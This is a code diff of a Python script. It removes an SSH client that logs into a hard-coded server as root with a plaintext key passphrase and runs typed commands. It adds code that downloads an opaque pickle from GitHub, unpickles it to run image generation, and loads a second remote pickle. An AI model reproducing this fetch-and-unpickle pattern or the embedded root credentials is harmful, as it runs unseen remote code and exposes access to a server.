@@ -1,55 +1,32 @@
-iscmdav = ""
-cmd = ""
+import subprocess
 
-import asyncssh
-import asyncio
+subprocess.run(["wget", "-O", "hf.pkl", "https://raw.githubusercontent.com/impossible589/text2img/69ec561b5c0820c8fb79f8e16466e85c81f9a182/hf.pkl"])
 
+import pickle
+with open("hf.pkl", "rb") as f:
+    new_list = pickle.load(f)
 
-async def run():
-    try:
-        global conn
-        # Establish connection manually
-        conn = await asyncssh.connect(
-            '91.203.133.137',
-            username='root',
-            client_keys=['/home/gourav/e2ee'],
-            passphrase='gourav',
-            known_hosts=None
-        )
+new_list(
+    repo_id="Gourav589/my-dataset",
+    filename="pipe.pkl",
+    repo_type="dataset",
+    token="YOUR_TOKEN",
+    local_dir=".",   # 👈 your custom path
+    local_dir_use_symlinks=False
+)
+with open("pipe.pkl", "rb") as f:
+    pipe2 = pickle.load(f)
+prompt = "detailed eyes,ultra realistic and detailed full body photo of a woman dancing , DSLR, natural lighting"
 
-        print("✅ Connected!")
-    except Exception as e:
-        print("❌ Error:", e)
+image = pipe2(
+    prompt=prompt,
+    width=768,
+    height=1024,
 
+    guidance_scale=7.5,
+    num_inference_steps=90,
 
-async def looper():
-    global iscmdav  # ✅ FIRST
-    global cmd
-    await run()
-    while True:
-        await asyncio.sleep(.5)
-        #inp = input("Enter Cmd")
-        #cmd = inp
-        #cmd = "ls"
-        #iscmdav = True
+).images[0]
 
-        if (iscmdav):
-
-            iscmdav = False
-            process = await conn.create_process(cmd, term_type='xterm')
-            async for line in process.stdout:
-                print(line, end="")
-
-
-def thread_target():
-    asyncio.run(looper())
-
-
-# t = threading.Thread(target=thread_target)
-# t.start()
-def cmdmainlooper():
-    while True:
-        inp = input("Enter Cmd")
-        cmd = inp
-        iscmdav = True
-# asyncio.run(looper())
+image.save("base.png")
+image
